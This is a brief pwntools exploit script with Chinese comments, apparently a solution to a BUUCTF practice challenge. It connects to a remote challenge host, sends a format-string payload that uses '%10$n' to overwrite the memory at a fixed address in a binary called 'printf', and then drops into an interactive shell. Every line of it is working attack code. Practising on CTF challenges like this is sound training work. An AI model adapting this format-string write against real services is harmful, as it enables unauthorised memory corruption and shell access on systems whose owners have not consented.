from pwn import *
# remote()建立远程连接,指明ip和port
io = remote('node4.buuoj.cn',29147)
#io=process("./printf")
payload= p32(0x0804C044) + b"%10$n"
io.sendlineafter("your name:",payload) #发送数据
io.interactive() #与shell进行交互
#0804c044